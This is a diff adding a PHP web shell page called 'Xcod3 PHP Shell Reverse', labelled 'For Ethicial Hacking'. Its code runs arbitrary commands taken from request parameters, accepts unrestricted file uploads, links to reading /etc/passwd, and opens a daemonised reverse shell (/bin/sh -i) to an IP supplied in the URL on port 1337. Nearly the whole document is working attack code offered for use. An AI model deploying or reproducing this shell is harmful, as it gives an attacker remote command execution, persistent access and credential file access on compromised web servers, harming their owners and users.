@@ -1,0 +1,283 @@
+<html>
+<head>
+<title>Xcod3 PHP Shell Reverse</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style type="text/css">
+@charset "UTF-8";
+html {
+	height: 100%;
+}
+body {
+	background-color: #000000;
+	display: flex;
+	flex-direction: column;
+	margin: 0;
+	height: inherit;
+	color: #00fc0a;
+	font-family: "Armata", sans-serif;
+	font-size: 1em;
+	font-weight: 400;
+	text-align: left;
+}
+.home {
+	display: flex;
+	flex-direction: column;
+	align-items: center;
+	justify-content: center;
+	flex: 1 0 auto;
+	padding: 0.5em;
+}
+.home a {
+	color: #03eb82;
+	font-size: 0.9em;
+	text-decoration: none;
+	cursor: pointer;
+}
+.home p {
+	margin: 0;
+	font-size: 1.2em;
+	text-align: center;
+	text-shadow: 0 0 0.5em #000;
+}
+.home p:not(:last-child) {
+	margin-bottom: 0.5em;
+}
+.home header {
+	text-align: center;
+	text-shadow: 0 0 0.5em #000;
+}
+.home header .title {
+	margin: 0;
+	font-size: 3.6em;
+	font-weight: 400;
+}
+.home header p {
+	margin: 0;
+	font-size: 1.7em;
+}
+.home img {
+	margin-bottom: 0.5em;
+	height: 14em;
+	color: #bc1818;
+	text-shadow: 0 0 0.5em #000;
+	border: 0.07em solid #000;
+}
+</style>
+</head>
+
+<body>
+	<div class="home">
+	<header>
+		<h1 class="title">Xcod3 PHP Shell Reverse</h1>
+		<p>For Ethicial Hacking</p><br>
+	</header>
+	<p>
+		<a href="?">Home</a> &#8226; 
+		<a href="?shell">Shell</a> &#8226; 
+		<a href="?inject">Upload</a> &#8226; 
+		<a href="?cmd=uname -a">Cek kernel</a> &#8226; 
+		<a href="?cmd=lsb_release -a">Cek Distro linux</a> &#8226; 
+		<a href="?cmd=php -v">Cek versi PHP</a> &#8226; 
+		<a href="?cmd=lscpu">Cek CPU</a> &#8226;  
+		<a href="?cmd=free">Cek RAM</a> &#8226;
+		<a href="?cmd=cat /etc/passwd">Cek User linux</a>
+
+	</p>
+<?php
+if (empty($_REQUEST)) {
+	echo '<img src="https://github.com/Xcod3bughunt3r/Xcod3bughunt3r/README.md" alt="ALIF FUSOBAR">';
+	echo '<br>';
+	echo '<a href="https://www.itsecurity.id">Dibuat Oleh ALIF FUSOBAR - master@itsecurity.id</a>';
+} 
+
+if (!empty($_GET['cmd'])) { 
+	echo "<pre>"; system($_GET['cmd']); echo "</pre>"; exit; 
+} 
+
+if(isset($_GET['inject'])) { 
+	if(isset($_POST['cekfile'])) {
+		move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
+		echo "Upload berhasil";
+	} else {
+		echo '<form enctype="multipart/form-data" action="" method="post">
+		Nama file : <input type="file" name="file" />
+		<br /><input name="cekfile" type="submit" value="Upload"></form>';
+ 	} 
+} 
+
+if(isset($_GET['shell'])) { 
+	if(isset($_POST['x'])) {
+		echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">
+		<input type="text" name="x" value="ls -l">
+		<input type="submit" value="Execute">
+		</form>';
+?>
+<pre>
+<?= `{$_POST['x']};` ?> </pre> <? die(); ?>
+<?php 
+	} else {
+		echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">
+		<input type="text" name="x" value="ls -l">
+		<input type="submit" value="Execute">
+    	</form>';
+ 	} 
+}
+?>
+	</div>
+<center>
+<?php
+if (!empty($_GET['reverse'])) { 
+	echo "<pre>"; 
+} 
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2022 master@itsecurity.id
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+
+set_time_limit (0);
+$VERSION = "1";
+$ip = $_GET["reverse"];
+$port = 1337;     
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+?>
+</center>
+</body>
+</html>
